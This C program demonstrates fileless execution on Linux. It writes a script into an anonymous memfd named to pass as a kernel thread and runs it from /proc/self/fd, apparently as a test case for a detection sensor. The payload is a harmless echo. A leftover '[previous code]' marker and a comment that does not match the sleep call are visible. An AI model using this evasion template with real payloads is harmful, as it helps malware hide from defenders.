#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>

int main() {
    printf("[*] Starting advanced evasion: memfd_create fileless execution\n");

    // 1. Create an anonymous file in RAM masquerading as a kernel thread
    int fd = memfd_create("kthread_worker", 0);
    if (fd == -1) {
        perror("memfd_create failed");
        return 1;
    }
    printf("[+] Created anonymous memory file (FD: %d)\n", fd);

    // 2. Write a payload into the memory file 
    // (Using a simple bash script here, but APTs would drop a full ELF binary)
    const char *payload = "#!/bin/bash\necho '[!!!] Fileless payload executing from RAM!'\n";
    write(fd, payload, strlen(payload));

    // 3. Construct the path to the file descriptor in memory
// ... [previous code] ...
    
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    
    printf("[*] Executing payload directly from %s...\n", fd_path);
    
    // NEW: Pause for 2 seconds to let the Python sensor catch up and rip the payload
    sleep(1); 
    
    // 4. Execute the RAM-only file
    char *args[] = {"kthread_worker", NULL};
    execv(fd_path, args);

    return 0;
}